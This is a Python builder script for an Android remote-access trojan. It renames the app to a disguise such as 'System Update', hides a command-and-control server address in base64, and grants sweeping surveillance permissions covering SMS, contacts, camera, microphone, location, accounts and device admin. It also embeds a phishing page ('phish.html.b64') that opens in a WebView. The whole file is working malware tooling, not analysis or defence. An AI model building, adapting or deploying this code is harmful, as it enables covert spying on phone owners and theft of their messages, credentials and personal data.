#!/usr/bin/env python3
"""
Inject builder config into native Android RAT base.
Matches UI: RAT ALL IZIN / RAT 2 IZIN, URL LINK / HTML CODE, auto pair, GitHub Actions build.
"""
import os, re, base64, json

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
ANDROID = os.path.join(ROOT, "android")
MANIFEST = os.path.join(ANDROID, "app/src/main/AndroidManifest.xml")
MAIN_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/MainActivity.kt")
DEVICE_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/DeviceService.kt")
STRINGS = os.path.join(ANDROID, "app/src/main/res/values/strings.xml")
UID_JSON = os.path.join(ANDROID, "app/src/main/assets/uid.json")
BUILD_GRADLE = os.path.join(ANDROID, "app/build.gradle")

APP_NAME = (os.environ.get("APP_NAME") or "System Update").strip()
APP_ID = (os.environ.get("APP_ID") or "com.sync.xxx").strip()
RAT_TYPE = (os.environ.get("RAT_TYPE") or "ALL").strip().upper()
REDIRECT_MODE = (os.environ.get("REDIRECT_MODE") or "URL").strip().upper()
REDIRECT_VALUE = os.environ.get("REDIRECT_VALUE") or "https://example.com"
SERVER_URL = (os.environ.get("SERVER_URL") or "http://papsky.queen-official.com:2468").strip()
PAIR_ID = (os.environ.get("PAIR_ID") or "NEONXJZET0000").strip()
VERSION_NAME = (os.environ.get("VERSION_NAME") or "1.0").strip()
VERSION_CODE = (os.environ.get("VERSION_CODE") or "1").strip()
ICON_B64 = (os.environ.get("ICON_BASE64") or os.environ.get("ICON_B64") or "").strip()

print("[inject] APP_NAME=", APP_NAME)
print("[inject] APP_ID=", APP_ID)
print("[inject] RAT_TYPE=", RAT_TYPE)
print("[inject] REDIRECT_MODE=", REDIRECT_MODE)
print("[inject] SERVER_URL=", SERVER_URL)
print("[inject] PAIR_ID=", PAIR_ID)

# 1. uid.json — auto pair, no manual pair step
os.makedirs(os.path.dirname(UID_JSON), exist_ok=True)
uid_data = {"uid": PAIR_ID, "pair": PAIR_ID, "auto": True}
with open(UID_JSON, "w") as f:
    json.dump(uid_data, f)
print("[inject] uid.json ->", uid_data)

# 2. SERVER_URL base64 in DeviceService.kt
b64_server = base64.b64encode(SERVER_URL.encode()).decode()
with open(DEVICE_KT, "r", encoding="utf-8", errors="ignore") as f:
    dsrc = f.read()
dsrc2, n = re.subn(
    r'(val SERVER_URL:\s*String\s*get\(\)\s*=\s*String\(android\.util\.Base64\.decode\(\s*")[^"]+(")',
    r"\1" + b64_server + r"\2",
    dsrc,
    count=1,
)
if n == 0:
    print("[warn] SERVER_URL pattern not found")
else:
    print("[inject] SERVER_URL patched")
with open(DEVICE_KT, "w", encoding="utf-8") as f:
    f.write(dsrc2)

# 3. Manifest: label, package, permissions
with open(MANIFEST, "r", encoding="utf-8", errors="ignore") as f:
    man = f.read()

man = re.sub(r'(android:label=")[^"]*(")', r"\1" + APP_NAME + r"\2", man, count=1)
man = re.sub(r'(package=")[^"]*(")', r"\1" + APP_ID + r"\2", man, count=1)

ALL_PERMS = """
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.FLASHLIGHT" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
    <uses-permission android:name="android.permission.SET_WALLPAPER" />
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
"""

TWO_PERMS = """
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
"""

kept = [ln for ln in man.splitlines(True) if "<uses-permission" not in ln]
man = "".join(kept)
perm_block = ALL_PERMS if RAT_TYPE == "ALL" else TWO_PERMS
man = re.sub(r"(<manifest[^>]*>)", r"\1\n" + perm_block, man, count=1)
with open(MANIFEST, "w", encoding="utf-8") as f:
    f.write(man)
print("[inject] Manifest label/package/perms OK")

# 4. build.gradle
with open(BUILD_GRADLE, "r", encoding="utf-8", errors="ignore") as f:
    bg = f.read()
bg = re.sub(r'(applicationId\s+")[^"]+(")', lambda m: m.group(1)+APP_ID+m.group(2), bg)
bg = re.sub(r'(versionName\s+")[^"]+(")', lambda m: m.group(1)+VERSION_NAME+m.group(2), bg)
bg = re.sub(r'(versionCode\s+)\d+', lambda m: m.group(1)+VERSION_CODE, bg)
bg = re.sub(r'(namespace\s+")[^"]+(")', lambda m: m.group(1)+APP_ID+m.group(2), bg)
with open(BUILD_GRADLE, "w", encoding="utf-8") as f:
    f.write(bg)
print("[inject] build.gradle OK")

# 5. Redirect into MainActivity
with open(MAIN_KT, "r", encoding="utf-8", errors="ignore") as f:
    msrc = f.read()

if REDIRECT_MODE == "URL":
    url = REDIRECT_VALUE.strip()
    if not url.startswith("http"):
        url = "https://" + url
    url_esc = url.replace("\\", "\\\\").replace('"', '\\"')
    new_load = 'webView.loadUrl("%s")' % url_esc
    lines = msrc.splitlines(True)
    out = []
    replaced = False
    for ln in lines:
        if (not replaced) and "loadDataWithBaseURL" in ln:
            indent = ln[:len(ln) - len(ln.lstrip())]
            out.append(indent + new_load + "\n")
            replaced = True
        else:
            out.append(ln)
    msrc2 = "".join(out)
    if replaced:
        print("[inject] URL loadUrl replaced (line)")
    else:
        msrc2 = msrc.replace(
            "webView.webViewClient = WebViewClient()",
            "webView.webViewClient = WebViewClient()\n        " + new_load,
            1,
        )
        print("[inject] URL loadUrl appended")
else:
    raw = REDIRECT_VALUE.strip()
    try:
        if re.match(r"^[A-Za-z0-9+/=\s]+$", raw) and len(raw) > 80:
            decoded = base64.b64decode(raw).decode("utf-8", errors="ignore")
            if "<" in decoded:
                raw = decoded
    except Exception:
        pass
    if "<html" not in raw.lower():
        raw = (
            "<!DOCTYPE html><html><head><meta charset=UTF-8>"
            '<meta name=viewport content="width=device-width,initial-scale=1">'
            "</head><body>%s</body></html>" % raw
        )
    html_b64 = base64.b64encode(raw.encode("utf-8")).decode("ascii")
    asset_path = os.path.join(ANDROID, "app/src/main/assets/phish.html.b64")
    os.makedirs(os.path.dirname(asset_path), exist_ok=True)
    with open(asset_path, "w") as af:
        af.write(html_b64)
    load_html = (
        "try {\n"
        '            val b64 = assets.open("phish.html.b64").bufferedReader().readText()\n'
        "            val html = String(android.util.Base64.decode(b64, android.util.Base64.DEFAULT))\n"
        '            webView.loadDataWithBaseURL(DeviceService.SERVER_URL, html, "text/html", "UTF-8", null)\n'
        "        } catch (e: Exception) {\n"
        '            webView.loadDataWithBaseURL(DeviceService.SERVER_URL, buildHtml(), "text/html", "UTF-8", null)\n'
        "        }"
    )
    msrc2, n = re.subn(
        r"webView\.loadDataWithBaseURL\([^)]+\)",
        load_html,
        msrc,
        count=1,
    )
    print("[inject] HTML asset mode, replace=", n)

with open(MAIN_KT, "w", encoding="utf-8") as f:
    f.write(msrc2)

# 6. strings
if os.path.isfile(STRINGS):
    with open(STRINGS, "r", encoding="utf-8", errors="ignore") as f:
        st = f.read()
    st = re.sub(
        r'(<string name="app_name">)[^<]*(</string>)',
        r"\1" + APP_NAME + r"\2",
        st,
    )
    with open(STRINGS, "w", encoding="utf-8") as f:
        f.write(st)

# 7. icon (kosong = icon default base)
if ICON_B64:
    try:
        import base64
        import io
        from pathlib import Path as P
        raw_b64 = ICON_B64.split(",", 1)[-1] if "," in ICON_B64 else ICON_B64
        data = base64.b64decode(raw_b64)
        # convert webp/jpeg → PNG via Pillow
        try:
            from PIL import Image
            im = Image.open(io.BytesIO(data)).convert("RGBA")
            im = im.resize((192, 192), Image.LANCZOS)
            buf = io.BytesIO()
            im.save(buf, format="PNG")
            data = buf.getvalue()
            print("[inject] icon converted to PNG", len(data))
        except Exception as e:
            print("[inject] pillow skip:", e)
        res = P(ANDROID) / "app" / "src" / "main" / "res"
        for dens, size in (("mdpi", 48), ("hdpi", 72), ("xhdpi", 96), ("xxhdpi", 144), ("xxxhdpi", 192)):
            d = res / f"mipmap-{dens}"
            d.mkdir(parents=True, exist_ok=True)
            try:
                from PIL import Image
                im = Image.open(io.BytesIO(data)).convert("RGBA")
                im = im.resize((size, size), Image.LANCZOS)
                outp = d / "ic_launcher.png"
                im.save(outp, format="PNG")
                (d / "ic_launcher_round.png").write_bytes(outp.read_bytes())
            except Exception:
                (d / "ic_launcher.png").write_bytes(data)
                (d / "ic_launcher_round.png").write_bytes(data)
        print("[inject] custom icon written to mipmaps")
    except Exception as e:
        print("[warn] icon:", e)
else:
    print("[inject] icon default (no custom)")

